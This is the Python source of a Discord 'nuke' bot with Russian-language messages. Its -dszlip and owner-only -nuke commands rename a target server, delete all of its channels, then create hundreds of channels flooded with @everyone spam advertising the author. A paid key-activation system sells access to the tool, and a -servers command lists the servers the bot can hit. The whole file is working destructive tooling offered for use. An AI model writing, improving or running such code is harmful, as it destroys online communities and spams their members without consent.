import discord
from discord.ext import commands
import asyncio
import time
import os
import json

bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)

OWNER_ID = 1448196738308509739
keys_db = "keys.json"

def load_keys():
    try:
        with open(keys_db, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(keys_db, "w") as f:
        json.dump(keys, f)

keys_data = load_keys()

def is_owner(ctx):
    return ctx.author.id == OWNER_ID

def has_key(user_id):
    return str(user_id) in keys_data

# ── СОБЫТИЯ ──
@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов')
    await bot.change_presence(activity=discord.Game(name="-dszlip"))

# ── КОМАНДЫ ──
@bot.command()
async def dszlip(ctx):
    if not has_key(ctx.author.id) and not is_owner(ctx):
        await ctx.send("❌ Нет ключа. Используй -key")
        return

    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права админа!")
        return

    await ctx.send("💀 zlip ebet")
    
    guild = ctx.guild
    start_time = time.time()
    
    await guild.edit(name="MOGGED BY ZLIP")
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    SPAM = """@everyone
MOGGED BY ZLIP
https://guns.lol/dszlip
ВЫ УПАЛИ НА КОЛЕНИ"""
    
    for i in range(500):
        try:
            ch = await guild.create_text_channel(f"zlip-{i+1}")
            for _ in range(5):
                await ch.send(SPAM)
            await asyncio.sleep(0.05)
        except:
            break
    
    elapsed = round(time.time() - start_time, 1)
    await ctx.send(f"✅ СЕРВЕР УНИЧТОЖЕН\nКаналов: 500\nВремя: {elapsed}с")

@bot.command()
async def key(ctx):
    await ctx.send("🔑 Используй: -activate КЛЮЧ\nПриобрести: @dszlip")

@bot.command()
async def activate(ctx, *, key: str = None):
    if not key:
        await ctx.send("❌ Использование: -activate КЛЮЧ")
        return
    
    if key in keys_data.values():
        await ctx.send("❌ Ключ уже использован")
        return
    
    if len(key) >= 8:
        keys_data[str(ctx.author.id)] = key
        save_keys(keys_data)
        await ctx.send("✅ Ключ активирован! Используй -dszlip")
    else:
        await ctx.send("❌ Неверный ключ")

@bot.command()
async def nuke(ctx, guild_id: int = None):
    if not is_owner(ctx):
        return
    
    if not guild_id:
        await ctx.send("❌ Использование: -nuke ID_СЕРВЕРА")
        return
    
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"❌ Сервер с ID {guild_id} не найден")
        return
    
    await ctx.send(f"🔥 НЮК: {guild.name}")
    
    await guild.edit(name="MOGGED BY ZLIP")
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    SPAM = """@everyone
MOGGED BY ZLIP
https://guns.lol/dszlip"""
    
    for i in range(500):
        try:
            ch = await guild.create_text_channel(f"zlip-{i+1}")
            for _ in range(5):
                await ch.send(SPAM)
        except:
            break
    
    await ctx.send(f"✅ {guild.name} уничтожен")

@bot.command()
async def servers(ctx):
    if not is_owner(ctx):
        return
    
    msg = ""
    for g in bot.guilds:
        msg += f"{g.name} | ID: {g.id} | {g.member_count} участников\n"
    
    await ctx.send(f"📊 СЕРВЕРЫ:\n{msg}")

@bot.command()
async def genkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        return
    
    if not user:
        await ctx.send("❌ Использование: -genkey @пользователь")
        return
    
    key = f"ZLIP-{int(time.time())}-{user.id}"[:16]
    keys_data[str(user.id)] = key
    save_keys(keys_data)
    
    await ctx.send(f"✅ Ключ выдан: {user.mention}\nКлюч: `{key}`")
    
    try:
        await user.send(f"🔑 Твой ключ: `{key}`\nИспользуй -activate {key}")
    except:
        pass

@bot.command()
async def delkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        return
    
    if not user:
        await ctx.send("❌ Использование: -delkey @пользователь")
        return
    
    if str(user.id) in keys_data:
        del keys_data[str(user.id)]
        save_keys(keys_data)
        await ctx.send(f"✅ Ключ удалён у {user.mention}")
    else:
        await ctx.send(f"❌ У {user.mention} нет ключа")

@bot.command()
async def keys(ctx):
    if not is_owner(ctx):
        return
    
    msg = ""
    for uid, key in keys_data.items():
        try:
            user = await bot.fetch_user(int(uid))
            msg += f"{user.name}: `{key}`\n"
        except:
            msg += f"`{uid}`: `{key}`\n"
    
    await ctx.send(f"🔑 АКТИВНЫЕ КЛЮЧИ:\n{msg}")

import os
bot.run(os.environ['TOKEN'])
